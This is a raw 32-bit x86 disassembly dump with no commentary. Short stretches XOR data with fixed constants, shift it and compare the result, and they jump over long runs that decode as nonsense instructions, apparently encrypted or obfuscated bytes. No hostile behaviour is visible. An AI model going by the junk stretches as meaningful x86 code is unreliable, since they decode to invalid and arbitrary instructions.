  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [edi+edi*2-0xf],0xc
  409ce0:	jle    0x409caf
  409ce2:	cmp    DWORD PTR [eax],ebx
  409ce4:	sbb    BYTE PTR [esi-0x19e7e7ee],bl
  409cea:	jp     0x409ccd
  409cec:	stc    
  409ced:	xchg   esp,eax
  409cee:	mov    dl,0xad
  409cf0:	cmp    DWORD PTR [eax-0x35],0x5bb2c892
  409cf7:	lock cld 
  409cf9:	adc    bh,BYTE PTR [eax]
  409cfb:	rol    DWORD PTR [esi+edx*8],1
  409cfe:	pop    ebx
  409cff:	inc    ebp
  409d00:	push   0xffffff9d
  409d02:	xlat   BYTE PTR ds:[ebx]
  409d03:	xchg   ebx,eax
  409d04:	in     al,0xde
  409d06:	mov    ds:0x14a71af9,al
  409d0b:	lock mov WORD PTR [edi+0x72],gs
  409d0f:	push   esi
  409d10:	xchg   ecx,eax
  409d11:	adc    esi,DWORD PTR [edi-0x49]
  409d14:	hlt    
  409d15:	dec    eax
  409d16:	ins    DWORD PTR es:[edi],dx
  409d17:	mov    bh,0xc8
  409d19:	fisub  DWORD PTR [ecx-0x1b5ccd9e]
  409d1f:	test   al,0x98
  409d21:	aam    0x9d
  409d23:	jb     0x409d60
  409d25:	scas   eax,DWORD PTR es:[edi]
  409d26:	push   esi
  409d27:	fstp   QWORD PTR fs:0x493821ed
  409d2e:	rcr    DWORD PTR [ebx],cl
  409d30:	mov    ebp,0x4850a8c6
  409d35:	xor    eax,0x3e5cdaa7
  409d3a:	test   al,0xe4
  409d3c:	test   eax,0x46e34c62
  409d41:	and    bl,BYTE PTR [eax+0x4]
  409d44:	xchg   edi,eax
  409d45:	mov    cl,0x63
  409d47:	or     bl,BYTE PTR [edx+eiz*8+0xf5b93bc]
  409d4e:	neg    ebp
  409d50:	in     al,dx
  409d51:	lahf   
  409d52:	mov    ecx,esp
  409d54:	jg     0x409db7
  409d56:	(bad)  
  409d57:	pop    ss
  409d58:	sub    ch,BYTE PTR [edx]
  409d5a:	(bad)  
  409d5b:	call   FWORD PTR [eax]
  409d5d:	test   BYTE PTR [edi+eax*8-0x51f6758c],ch
  409d64:	sub    bh,BYTE PTR [eax+0x29769f9a]
  409d6a:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  409d6c:	fcom   QWORD PTR [esi]
  409d6e:	addr16 xor esp,eax
  409d71:	and    dh,0xba
  409d74:	out    0xda,eax
  409d76:	cs icebp 
  409d78:	mov    ebx,0xb5d30f48
  409d7d:	(bad)  
  409d7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d7f:	inc    edi
  409d80:	pop    es
  409d81:	fxch   st(1)
  409d83:	scas   al,BYTE PTR es:[edi]
  409d84:	pop    ebp
  409d85:	add    edx,esp
  409d87:	jmp    0x7670463e
  409d8c:	push   ss
  409d8d:	lds    edi,FWORD PTR [esi+esi*1-0x7cc9ec37]
  409d94:	fsub   DWORD PTR [esi+0x64]
  409d97:	add    esi,ebx
  409d99:	sub    edi,DWORD PTR [edi+0x0]
  409d9c:	add    edi,DWORD PTR [ecx]
  409d9e:	test   DWORD PTR [edx-0x4c4937ee],edx
  409da4:	adc    eax,0x4e30a1a1
  409da9:	lahf   
  409daa:	push   eax
  409dab:	xlat   BYTE PTR ds:[ebx]
  409dac:	mov    ecx,0xb8e1aae5
  409db1:	xor    eax,0xe466cbcc
  409db6:	dec    esi
  409db7:	or     edx,0xffffffce
  409dba:	ja     0x409e01
  409dbc:	push   ds
  409dbd:	xlat   BYTE PTR ds:[ebx]
  409dbe:	adc    edi,DWORD PTR [ecx]
  409dc0:	stos   DWORD PTR es:[edi],eax
  409dc1:	mov    ah,0x4c
  409dc3:	pop    ss
  409dc4:	mov    eax,ds:0x70403b6d
  409dc9:	dec    edx
  409dca:	bound  eax,QWORD PTR [edi]
  409dcc:	bound  esp,QWORD PTR [ecx+edx*4+0x24]
  409dd0:	mov    edx,0xbfdecb21
  409dd5:	push   ecx
  409dd6:	push   ecx
  409dd7:	test   bl,0x92
  409dda:	jle    0x409e2e
  409ddc:	pop    edx
  409ddd:	std    
  409dde:	or     cl,cl
  409de0:	neg    edi
  409de2:	add    al,0x6b
  409de4:	fst    QWORD PTR [ebp+0x3d]
  409de7:	aaa    
  409de8:	xor    eax,0x5af20460
  409ded:	pop    ds
  409dee:	lock call FWORD PTR [ecx]
  409df1:	mov    dl,0xd8
  409df3:	(bad)
  409df6:	es gs mov ecx,0xbb143835
  409dfd:	icebp  
  409dfe:	inc    edx
  409dff:	jmp    0x9452:0xcfddf982
  409e06:	cwde   
  409e07:	ja     0x409dfb
  409e09:	pop    ds
  409e0a:	mov    cl,0x41
  409e0c:	pop    ebx
  409e0d:	dec    esi
  409e0e:	jne    0x409e3a
  409e10:	ret    0x2318
  409e13:	mov    ds:0x89250df0,al
  409e18:	leave  
  409e19:	jns    0x409e4c
  409e1b:	ja     0x409e61
  409e1d:	rcl    ebp,cl
  409e1f:	or     eax,0x7c022de1
  409e24:	fldz   
  409e26:	mov    eax,0xc9303f1f
  409e2b:	adc    DWORD PTR [eax],esp
  409e2d:	es push esp
  409e2f:	fld    QWORD PTR [eax]
  409e31:	add    DWORD PTR [edi],ebp
  409e33:	retf   
  409e34:	test   eax,0x8285d6f3
  409e39:	push   edi
  409e3a:	mov    DWORD PTR [esi-0xe05e359],esp
  409e40:	es dec ebp
  409e42:	aad    0x4e
  409e44:	jb     0x409dd6
  409e46:	pop    ds
  409e47:	sub    al,0x63
  409e49:	xchg   ebp,eax
  409e4a:	retf   
  409e4b:	and    edx,DWORD PTR [eax-0x20012ea6]
  409e51:	cmp    al,0x5b
  409e53:	inc    ecx
  409e54:	sub    ebp,edi
  409e56:	int3   
  409e57:	fnstsw WORD PTR [ebx]
  409e59:	or     DWORD PTR [eax-0x5e5742c9],0x1f
  409e60:	cdq    
  409e61:	fcmovnu st,st(5)
  409e63:	clc    
  409e64:	and    ah,BYTE PTR [ebp-0x50ab23c8]
  409e6a:	cmc    
  409e6b:	fcomi  st,st(7)
  409e6d:	add    eax,0x529667ac
  409e72:	jb     0x409e47
  409e74:	(bad)  
  409e76:	out    dx,al
  409e77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e78:	pop    esp
  409e79:	mov    bh,0xc1
  409e7b:	add    ch,ch
  409e7d:	push   ss
  409e7e:	enter  0xab1f,0x7d
  409e82:	mov    ch,0x2f
  409e84:	lods   eax,DWORD PTR ds:[esi]
  409e85:	cwde   
  409e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e87:	and    al,0x63
  409e89:	std    
  409e8a:	xor    esi,DWORD PTR [ebx+0x4d]
  409e8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e8e:	gs pop ebp
  409e90:	jle    0x409ec8
  409e92:	add    eax,edx
  409e94:	xchg   BYTE PTR [ebp-0x1f],al
  409e97:	xchg   edi,eax
  409e98:	(bad)  
  409e99:	jae    0x409e48
  409e9b:	bound  ecx,QWORD PTR [eiz*4+0x6e0946d9]
  409ea2:	xchg   BYTE PTR [ecx-0x5f],ah
  409ea5:	cdq    
  409ea6:	sub    ah,al
  409ea8:	mov    esi,0x3d9227bf
  409ead:	test   BYTE PTR [edx+0x7e],bh
  409eb0:	sub    BYTE PTR [esi+0x3a],0xb5
  409eb4:	jecxz  0x409ef1
  409eb6:	dec    esi
  409eb7:	(bad)
  409ebb:	push   0xffffffe5
  409ebd:	adc    esp,DWORD PTR [edi-0x22]
  409ec0:	jo     0x409ee9
  409ec2:	out    0x1e,al
  409ec4:	outs   dx,DWORD PTR ds:[esi]
  409ec5:	les    esp,FWORD PTR [ecx+0x212aa3f1]
  409ecb:	inc    ebp
  409ecc:	(bad)  
  409ecd:	shl    ebx,0x79
  409ed0:	out    dx,al
  409ed1:	lahf   
  409ed2:	mov    ss,WORD PTR [ebx-0x27f63f79]
  409ed8:	mov    eax,0x46fa36a6
  409edd:	adc    eax,0x3e8b742b
  409ee2:	pusha  
  409ee3:	or     edi,DWORD PTR [edx+0x68adb973]
  409ee9:	imul   ecx,DWORD PTR [eax-0x1f],0xffffffdf
  409eed:	jmp    0xad43:0x8a0bcdf
  409ef4:	int3   
  409ef5:	test   DWORD PTR [esi+0x68],ecx
  409ef8:	repz xor eax,0x3dded9b
  409efe:	mov    WORD PTR [eax],ds
  409f00:	stos   BYTE PTR es:[edi],al
  409f01:	or     BYTE PTR [edi+0x6b],ch
  409f04:	add    eax,0x43dbdc4
  409f09:	mov    ebx,ebx
  409f0b:	mov    ss,WORD PTR [eax]
  409f0d:	jo     0x409ee8
  409f0f:	jno    0x409f47
  409f11:	mov    DWORD PTR ds:0x9cc718e9,ebx
  409f17:	mov    eax,0xd538965f
  409f1c:	jno    0x409f8c
  409f1e:	add    edx,ebp
  409f20:	js     0x409eb1
  409f22:	or     DWORD PTR [eax],0x9c8440a0
  409f28:	es mov bh,dl
  409f2b:	xor    al,0xf9
  409f2d:	jp     0x409f17
  409f2f:	faddp  st(5),st
  409f31:	and    al,0xa5
  409f33:	xchg   ecx,eax
  409f34:	xor    ah,BYTE PTR [ebx]
  409f36:	xchg   ebp,eax
  409f37:	fstp   TBYTE PTR [esi]
  409f39:	stos   BYTE PTR es:[edi],al
  409f3a:	push   edx
  409f3b:	jmp    0x409f7c
  409f3d:	loop   0x409f57
  409f3f:	or     bl,al
  409f41:	sbb    al,BYTE PTR [ecx-0x487ead]
  409f47:	in     al,dx
  409f48:	sbb    al,0xc9
  409f4a:	sbb    dl,BYTE PTR [esi]
  409f4c:	inc    eax
  409f4d:	jmp    0xbbb1:0x2caeb9c
  409f54:	pop    edi
  409f55:	pop    esp
  409f56:	cmp    BYTE PTR [ebp-0x39],dh
  409f59:	repnz inc edx
  409f5b:	xor    al,0xa0
  409f5d:	push   eax
  409f5e:	sbb    dh,bh
  409f60:	inc    esi
  409f61:	aas    
  409f62:	xchg   ebp,eax
  409f63:	add    esi,DWORD PTR [edi-0x2e]
  409f66:	pop    ss
  409f67:	mov    gs,WORD PTR ds:0xc8903b08
  409f6d:	je     0x409f05
  409f6f:	pop    ds
  409f70:	idiv   BYTE PTR [edx-0x6c3a75db]
  409f76:	dec    ecx
  409f77:	and    eax,0xf628e380
  409f7c:	fmul   DWORD PTR [ecx+0x5cb73e9c]
  409f82:	enter  0x8d6,0x92
  409f86:	ret    0x3473
  409f89:	xchg   esi,ebx
  409f8b:	aam    0xc1
  409f8d:	and    al,bh
  409f8f:	jle    0x409fad
  409f91:	push   0x5d
  409f93:	ins    BYTE PTR es:[edi],dx
  409f94:	pop    esp
  409f95:	ret    
  409f96:	call   0x14fab45c
  409f9b:	inc    eax
  409f9c:	mov    BYTE PTR [ebx],dh
  409f9e:	in     eax,dx
  409f9f:	in     eax,dx
  409fa0:	cs push esp
  409fa2:	retf   
  409fa3:	xchg   edi,eax
  409fa4:	in     al,dx
  409fa5:	sub    eax,0xb82da2ee
  409faa:	push   ebx
  409fab:	push   esi
  409fac:	adc    ch,BYTE PTR [eax+0x425704cf]
  409fb2:	outs   dx,DWORD PTR ds:[esi]
  409fb3:	lock jno 0x40a020
  409fb6:	loop   0x409f97
  409fb8:	xchg   ebx,eax
  409fb9:	popf   
  409fba:	pop    esp
  409fbb:	inc    eax
  409fbc:	add    ch,al
  409fbe:	mov    eax,0xc024cadb
  409fc3:	jmp    0xc9fc35e6
  409fc8:	stos   DWORD PTR es:[edi],eax
  409fc9:	call   0xd64aecee
  409fce:	xor    al,0x33
  409fd0:	inc    edx
  409fd1:	sahf   
  409fd2:	xor    edx,ebp
  409fd4:	aad    0xf2
  409fd6:	sub    DWORD PTR [ebx-0x53],esp
  409fd9:	jo     0x40a023
  409fdb:	jb     0x409fc0
  409fdd:	mov    al,0xc1
  409fdf:	cmp    ebx,DWORD PTR [eax-0x2a]
  409fe2:	add    ebx,DWORD PTR [eax+0xd]
  409fe5:	inc    ebp
  409fe6:	ins    DWORD PTR es:[edi],dx
  409fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe8:	mov    ss,WORD PTR [ecx-0x3672d0d9]
  409fee:	rcr    DWORD PTR [eax+esi*4+0x1],1
  409ff2:	out    0x6d,al
  409ff4:	(bad)  
  409ff5:	fdivr  st,st(6)
  409ff7:	jp     0x40a077
  409ff9:	imul   edx,DWORD PTR ds:0x77aebaf,0xffffffd5
  40a000:	sub    edi,DWORD PTR [ecx]
  40a002:	push   edx
  40a003:	mov    ah,0x84
  40a005:	pop    esi
  40a006:	pop    esp
  40a007:	dec    edx
  40a008:	shr    dl,cl
  40a00a:	pop    ss
  40a00b:	fwait
  40a00c:	add    eax,0x6bc740f6
  40a011:	dec    edi
  40a012:	data16 cli 
  40a014:	call   0x4378:0xac94b827
  40a01b:	mov    edi,0x314ae201
  40a020:	out    0xca,al
  40a022:	imul   esp,DWORD PTR ds:0x2d9a2741,0x2b
  40a029:	xchg   ecx,eax
  40a02a:	in     al,dx
  40a02b:	push   cs
  40a02c:	or     esi,DWORD PTR [ebx]
  40a02e:	inc    ebp
  40a02f:	lods   eax,DWORD PTR ds:[esi]
  40a030:	dec    ecx
  40a031:	adc    BYTE PTR [edx-0x5c],ch
  40a034:	arpl   WORD PTR [esi+0x2c],si
  40a037:	ins    BYTE PTR es:[edi],dx
  40a038:	adc    edi,DWORD PTR [ecx+0x13c7211]
  40a03e:	jmp    0x701d816a
  40a043:	add    ah,BYTE PTR [esi-0x5701d88]
  40a049:	push   eax
  40a04a:	ins    DWORD PTR es:[edi],dx
  40a04b:	xor    eax,0xc5dd059
  40a050:	stc    
  40a051:	in     al,dx
  40a052:	cmp    DWORD PTR [ebp+0x61],esi
  40a055:	rcr    BYTE PTR [ebx],0x96
  40a058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a059:	ds mov ebx,?
  40a05c:	sbb    ebx,DWORD PTR [edx-0x59f665d2]
  40a062:	mov    esp,0xd44d7455
  40a067:	int    0xd4
  40a069:	je     0x40a0c0
  40a06b:	mov    bl,0x33
  40a06d:	inc    ecx
  40a06e:	inc    cx
  40a070:	into   
  40a071:	cmp    DWORD PTR [ecx+0x67db755d],0xa66455c6
  40a07b:	pop    edi
  40a07c:	rcr    BYTE PTR [edx],1
  40a07e:	test   dl,al
  40a080:	adc    ah,BYTE PTR [bp+di-0x70]
  40a084:	lods   eax,DWORD PTR ds:[esi]
  40a085:	inc    eax
  40a086:	loope  0x40a061
  40a088:	int3   
  40a089:	xchg   edx,eax
  40a08a:	mov    ds:0xd900ace8,al
  40a08f:	dec    esi
  40a090:	daa    
  40a091:	rol    ebx,1
  40a093:	repnz mov BYTE PTR [ebx+0x44],al
  40a097:	pop    esp
  40a098:	inc    eax
  40a099:	jno    0x40a0bc
  40a09b:	cs mov al,0xa4
  40a09e:	mov    edi,0x769cd8e8
  40a0a3:	or     al,bl
  40a0a5:	mov    ch,0x73
  40a0a7:	sbb    BYTE PTR [edi+0x44],al
  40a0aa:	mov    edi,DWORD PTR [esi+0x4]
  40a0ad:	mov    edi,DWORD PTR [ebp+0x14]
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	mov    edi,DWORD PTR [esi+0x33527cc3]
  40a12e:	sbb    BYTE PTR [eax],bl
  40a130:	sahf   
  40a131:	adc    bl,BYTE PTR [eax]
  40a133:	sbb    BYTE PTR [esi+0xee0c8c3],dh
  40a139:	mov    ebx,0x87cf3fa5
  40a13e:	test   al,0x0
  40a140:	and    esp,ebx
  40a142:	repz fwait
  40a144:	lea    ecx,[ecx+0x3e]
  40a147:	or     al,0x6d
  40a14a:	outs   dx,DWORD PTR ds:[esi]
  40a14b:	sub    ecx,esp
  40a14d:	out    0xea,eax
  40a14f:	fcom   QWORD PTR [edi-0x103f9f3f]
  40a155:	repz inc edx
  40a157:	pop    ds
  40a158:	jle    0x40a11c
  40a15a:	dec    eax
  40a15b:	xchg   edx,eax
  40a15c:	outs   dx,DWORD PTR ds:[esi]
  40a15d:	stc    
  40a15e:	cmc    
  40a15f:	xchg   bh,dl
  40a161:	mov    al,0x7
  40a163:	stc    
  40a164:	xor    BYTE PTR ds:0x69286163,0xa2
  40a16b:	or     al,0x3f
  40a16d:	xchg   esp,eax
  40a16e:	mov    ds:0xf189285b,al
  40a173:	add    DWORD PTR [edi+0xe55e8a4],esi
  40a179:	stc    
  40a17a:	pop    es
  40a17b:	dec    eax
  40a17c:	(bad)  
  40a17d:	inc    esp
  40a17e:	push   ebp
  40a17f:	and    esp,DWORD PTR [ebp-0x67]
  40a182:	(bad)  gs:[ecx+0x67]
  40a186:	mov    ebp,0xe8f36fdc
  40a18b:	iret   
  40a18c:	adc    DWORD PTR [ebx+0x6f],eax
  40a18f:	scas   al,BYTE PTR es:[edi]
  40a190:	les    ebx,FWORD PTR [edx+0x8]
  40a193:	std    
  40a194:	cli    
  40a195:	xchg   DWORD PTR [ebp-0xc],ebx
  40a198:	sub    al,0x78
  40a19a:	mov    edx,0x4b038ec
  40a19f:	jbe    0x40a1d8
  40a1a1:	dec    edx
  40a1a2:	sahf   
  40a1a3:	sbb    ebx,DWORD PTR [esi+edi*4+0x16]
  40a1a7:	xor    ebx,DWORD PTR [esi+0x19971ecf]
  40a1ad:	add    eax,0xc856acc3
  40a1b2:	data16 lods al,BYTE PTR ds:[esi]
  40a1b4:	xor    al,0x53
  40a1b6:	cmp    bl,ch
  40a1b8:	pop    ebx
  40a1b9:	(bad)  
  40a1ba:	repnz mov cl,0x4b
  40a1bd:	(bad)  
  40a1be:	sub    bh,bh
  40a1c0:	inc    esi
  40a1c1:	retf   
  40a1c2:	push   edx
  40a1c3:	ror    DWORD PTR [eax],1
  40a1c5:	lods   eax,DWORD PTR ds:[esi]
  40a1c6:	into   
  40a1c7:	mov    ah,0x64
  40a1c9:	mov    bl,0x78
  40a1cb:	call   0xf9d663a
  40a1d0:	push   0xffffffd6
  40a1d2:	mov    esi,0x4de27ddd
  40a1d7:	outs   dx,DWORD PTR ds:[esi]
  40a1d8:	aas    
  40a1d9:	cld    
  40a1da:	sub    al,0x95
  40a1dc:	aam    0x94
  40a1de:	jo     0x40a21b
  40a1e0:	retf   
  40a1e1:	push   0x882b6746
  40a1e6:	pop    esp
  40a1e7:	cmp    ah,dh
  40a1e9:	imul   esp,DWORD PTR ds:0xa19f6073,0xffffffee
  40a1f0:	aas    
  40a1f1:	dec    ebp
  40a1f2:	hlt    
  40a1f3:	inc    edi
  40a1f4:	push   0x5f
  40a1f6:	jle    0x40a1cf
  40a1f8:	or     bh,dh
  40a1fa:	out    dx,eax
  40a1fb:	jne    0x40a1b9
  40a1fd:	pop    ebx
  40a1fe:	pushf  
  40a1ff:	data16 adc BYTE PTR [ebx],bh
  40a202:	xor    bl,dl
  40a204:	jl     0x40a227
  40a206:	xchg   BYTE PTR [esi-0x222d1a84],dh
  40a20c:	cmp    eax,0x770c1b95
  40a211:	lods   al,BYTE PTR ds:[esi]
  40a212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a213:	repz jecxz 0x40a1ba
  40a216:	jp     0x40a1a6
  40a218:	adc    BYTE PTR [edi+0x1b],cl
  40a21b:	pop    ecx
  40a21c:	cmp    al,0x99
  40a21e:	inc    ecx
  40a21f:	mov    ds:0x26c5e7d5,al
  40a224:	bound  ebx,QWORD PTR [edx+0x745f015a]
  40a22a:	into   
  40a22b:	cmc    
  40a22c:	pop    edx
  40a22d:	ss xchg edx,eax
  40a22f:	mov    DWORD PTR ds:0xcab14892,edx
  40a235:	ss jae 0x40a22f
  40a238:	pop    ebx
  40a239:	loopne 0x40a239
  40a23b:	data16 fbstp TBYTE PTR [esi+edi*8+0x78d801c7]
  40a243:	mov    edi,0xd4a85a7d
  40a248:	aaa    
  40a249:	pop    esi
  40a24a:	cmp    DWORD PTR [esi-0x739714f3],eax
  40a250:	jg     0x40a283
  40a252:	not    cl
  40a254:	xor    esi,DWORD PTR [eax+0x30]
  40a257:	daa    
  40a258:	scas   al,BYTE PTR es:[edi]
  40a259:	call   0xbcfb0678
  40a25e:	jno    0x40a218
  40a260:	sub    al,0x4f
  40a262:	imul   DWORD PTR [eax]
  40a264:	fcom   st(2)
  40a266:	sbb    dh,al
  40a268:	xchg   ebx,eax
  40a269:	dec    eax
  40a26a:	mov    dl,0x5
  40a26c:	test   al,0x8e
  40a26e:	inc    ebp
  40a26f:	scas   eax,DWORD PTR es:[edi]
  40a270:	int    0x55
  40a272:	or     dl,dh
  40a274:	mov    esp,0xc987eac4
  40a279:	(bad)  [eax+0x1e18686e]
  40a27f:	cmp    eax,DWORD PTR [esi+0x4dddcd6d]
  40a285:	pop    edi
  40a286:	push   ss
  40a287:	push   eax
  40a288:	js     0x40a20a
  40a28a:	cmp    cl,BYTE PTR [ecx-0x72]
  40a28d:	sbb    eax,0xb5e89406
  40a292:	inc    ecx
  40a293:	pop    ss
  40a294:	push   esi
  40a295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a296:	mov    edx,0xa385fee3
  40a29b:	inc    DWORD PTR ds:0xff7b4720
  40a2a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2a2:	and    dl,0x8f
  40a2a5:	iret   
  40a2a6:	repnz mov ds:0xcd82596f,al
  40a2ac:	jg     0x40a286
  40a2ae:	mov    edi,DWORD PTR cs:[ebp+0x27]
  40a2b2:	cmp    eax,DWORD PTR [eax]
  40a2b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2b5:	(bad)  
  40a2b6:	mov    ebx,0xa0d72c25
  40a2bb:	add    bl,bl
  40a2bd:	and    BYTE PTR [eax-0xe],al
  40a2c0:	ins    DWORD PTR es:[edi],dx
  40a2c1:	nop
  40a2c2:	mov    ebp,0x9ad1aa50
  40a2c7:	mov    eax,0xf584e30c
  40a2cc:	cmp    BYTE PTR [esi],0xa
  40a2cf:	cmp    dh,BYTE PTR [ebx]
  40a2d1:	shl    BYTE PTR [edx-0x2df1fa5],1
  40a2d7:	xor    BYTE PTR [ebx+0x1],dl
  40a2da:	cs mov eax,ds:0xb3a1e669
  40a2e1:	adc    bh,al
  40a2e3:	fcomp  DWORD PTR [ebx+0x619f06a7]
  40a2e9:	(bad)  
  40a2ec:	sbb    eax,0x9107d672
  40a2f1:	out    0x2e,al
  40a2f3:	retf   
  40a2f4:	inc    ebp
  40a2f5:	mov    ebx,?
  40a2f7:	mov    ch,0xd
  40a2f9:	sub    DWORD PTR [eax-0x39],0x23
  40a2fd:	nop
  40a2fe:	push   0x4e
  40a300:	adc    BYTE PTR [eax+0x6db30e01],bl
  40a306:	xor    al,0xc2
  40a308:	leave  
  40a309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a30a:	mov    esp,0x74d246dc
  40a30f:	popf   
  40a310:	add    ch,dh
  40a312:	mov    ah,0x8a
  40a314:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a316:	adc    al,0xb4
  40a318:	loope  0x40a2b8
  40a31a:	mov    esi,0xae89bf05
  40a31f:	or     ecx,DWORD PTR [edi-0x69]
  40a322:	mov    ds,WORD PTR [edi]
  40a324:	sbb    dl,bh
  40a326:	pop    ebx
  40a327:	pop    ds
  40a328:	sahf   
  40a329:	inc    ebx
  40a32a:	cmp    al,0x17
  40a32c:	aam    0x99
  40a32e:	cmp    al,0xc5
  40a330:	mov    al,BYTE PTR [edx]
  40a332:	fdivr  DWORD PTR es:[ecx-0x1d4d213d]
  40a339:	or     eax,0xfc2be1af
  40a33e:	mov    edx,0x1089c986
  40a343:	jnp    0x40a32b
  40a345:	mov    ecx,0x93bc150f
  40a34a:	mov    esp,0xb7bd3229
  40a34f:	test   BYTE PTR [ebx-0x67],ah
  40a352:	fcom   QWORD PTR [ebx]
  40a354:	mov    edx,0x52c2eb60
  40a359:	push   ecx
  40a35a:	mov    ch,0x54
  40a35c:	xchg   ebx,eax
  40a35d:	outs   dx,DWORD PTR ds:[esi]
  40a35e:	push   0x24
  40a360:	and    al,0x74
  40a362:	jmp    0x3dcdcdbd
  40a367:	mov    ah,0x5e
  40a369:	lods   eax,DWORD PTR ds:[esi]
  40a36a:	fidiv  DWORD PTR [ebp+0x739c2cd]
  40a370:	in     al,0xc5
  40a372:	stc    
  40a373:	cld    
  40a374:	pop    edx
  40a375:	jns    0x40a337
  40a377:	test   al,al
  40a379:	das    
  40a37a:	jb     0x40a34f
  40a37c:	jmp    0x9b06d20c
  40a381:	popf   
  40a382:	fdiv   DWORD PTR [ebx-0xa]
  40a385:	ret    
  40a386:	fs add al,0xe2
  40a389:	sar    BYTE PTR [ebx],1
  40a38b:	int    0xf2
  40a38d:	fs (bad) 
  40a38f:	adc    BYTE PTR [eax],cl
  40a391:	xchg   BYTE PTR ds:0xd5a15822,ah
  40a397:	mov    ecx,0x1459d3da
  40a39c:	inc    DWORD PTR [ecx-0x6]
  40a39f:	mov    ds:0x17c54e29,eax
  40a3a4:	cmp    ah,BYTE PTR [esi+0x5da6a405]
  40a3aa:	fild   WORD PTR [edx]
  40a3ac:	aaa    
  40a3ad:	and    eax,0x41cb1737
  40a3b2:	jmp    0xde91:0x95c2a2ea
  40a3b9:	out    dx,al
  40a3ba:	fmul   DWORD PTR [edx-0x5d]
  40a3bd:	addr16 cdq 
  40a3bf:	sub    eax,DWORD PTR [ecx-0x678b9708]
  40a3c5:	loope  0x40a402
  40a3c7:	or     BYTE PTR [edx+eax*8+0x4d2c3a4b],bl
  40a3ce:	sbb    dh,bl
  40a3d0:	dec    ecx
  40a3d1:	push   eax
  40a3d2:	adc    al,0x84
  40a3d4:	mov    fs,WORD PTR [ebx+0x3847b368]
  40a3da:	xchg   ebx,eax
  40a3db:	repnz add al,0xba
  40a3de:	dec    edi
  40a3df:	mul    DWORD PTR [ebp+0x354c2ff2]
  40a3e5:	and    dl,dl
  40a3e7:	repnz icebp 
  40a3e9:	inc    esp
  40a3ea:	pop    edx
  40a3eb:	cmp    eax,0xf14b6810
  40a3f0:	or     dh,BYTE PTR [edx+edx*4]
  40a3f3:	pop    es
  40a3f4:	and    al,BYTE PTR [edi+0x29]
